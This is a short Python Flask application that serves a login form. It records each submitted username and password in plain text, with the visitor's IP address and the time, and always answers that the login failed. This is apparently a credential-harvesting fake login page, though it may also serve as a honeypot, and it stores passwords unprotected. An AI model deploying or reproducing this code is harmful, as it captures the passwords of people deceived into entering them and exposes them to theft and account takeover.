from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        with open('login_attempts.log', 'a') as f:
            f.write(f"{datetime.now()} - IP: {request.remote_addr}, Username: {request.form['username']}, Password: {request.form['password']}\n")
        return "Login failed. Please try again."
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
